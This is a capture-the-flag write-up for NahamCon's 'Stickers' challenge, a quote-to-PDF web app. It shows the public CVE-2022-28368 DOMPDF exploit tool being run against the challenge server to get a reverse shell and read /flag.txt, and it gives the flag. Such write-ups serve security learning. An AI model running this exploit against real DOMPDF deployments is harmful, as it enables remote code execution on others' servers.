# Stickers
> Wooohoo!!! Stickers!!! Hackers love STICKERS!! You can make your own with our new website!

> Find the flag file in /flag.txt at the root of the filesystem.

## About the Challenge
We got a server that has a functionality to convert our input into a PDF file


[Image extracted text: Sticker Shop
High quality; fully custom sticker printing and printed labels on paper or vinyl at affordable prices Our automated quote service will calculate the
for your stickers. Once you are
get in contact with us to complete your order:
Organisation Name
test
The name of your organisation
Email
test@mailcom
Number of small stickers
Small stickers are 3X3 inches
Number of medium stickers
Medium stickers are 9X9 inches
Number
stickers
Large stickers are 15X15 inches
Submit
price
happy
large]



[Image extracted text: < >
C
Not secure
challenge nahamconcom 32261/quote php?organisation-test&email-test%4Omail com&small-O&medium-O&large-0
Quote
100%
+
Q
0
Sticker Shop
Quotation for:
test
test@mail.com
Saturday 17th of June 2023
Product
Qty
Price (100 stickers)
Total
Product A
5S
0S
Product B
10S
0S
Product C
305
0S
Total
0S
Shipping not included
If you have any questions don't hesitate to contact our sales team
sales@company.com]


## How to Solve?
At first, I thought this website was vulnerable to SSRF where we can input `<iframe src="http://127.0.0.1">` in the `organization` or `email` parameter but I was wrong

And I accidentally made the website error


[Image extracted text: 6 > C
Not secure
challenge nahamconcom 32261/quote ph
Unable to stream pdf: headers already sent]


I researched about this error message, and it appears that this website uses `DOMPDF` to convert our input into a PDF file. Because this website utilizes `DOMPDF`, it reminded me of a machine on HTB where the user had to exploit `RCE` on `DOMPDF`.

Im using this [tool](https://github.com/rvizx/CVE-2022-28368) to easier my work and here is the command I used to exploit the website

```shell
python3 dompdf-rce.py --inject "http://challenge.nahamcon.com:32261/quote.php?email=test%40mail.com&small=3&medium=3&large=3&organisation=" --dompdf "http://challenge.nahamcon.com:32261/dompdf/"
```

And heck yeah, we got a reverse shell. And then read `/flag.txt` to obtain the flag


[Image extracted text: <b4-7697d9b8b-ScSpb: /var /ww/html/dompdf /Lib/fontss ls
Ls
bin
boot
dev
etc
txt
home
lib
1ib64
media
mnt
opt
proc
root
run
sbin
Srv
sys
usr
var
<b4-7697d9b8b-ScSpb: /var
/html/dompdf /Lib/fontss cat /flag.txt
cat
Iflag.txt
flag{a4dS2beabcfdeboba79fc08709bb5508}
flag
tmp
IwWWe]


```
flag{a4d52beabcfdeb6ba79fc08709bb5508}
```